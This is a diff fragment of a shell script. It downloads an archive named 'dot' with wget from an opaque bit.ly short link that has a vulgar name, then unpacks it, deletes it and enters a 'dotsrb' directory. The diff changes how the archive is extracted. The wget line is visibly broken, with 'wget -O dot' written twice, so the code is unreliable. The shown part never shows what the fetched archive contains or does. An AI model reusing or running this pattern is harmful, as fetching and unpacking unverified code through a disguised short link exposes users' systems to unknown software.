@@ -4,7 +4,9 @@ kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)
 
 wget -O dot wget -O dot bit.ly/KONTOL-AKU-GEDE
 
-tar xvf dot
+tar -xzvf dot
+
+rm dot
 
 cd dotsrb
 
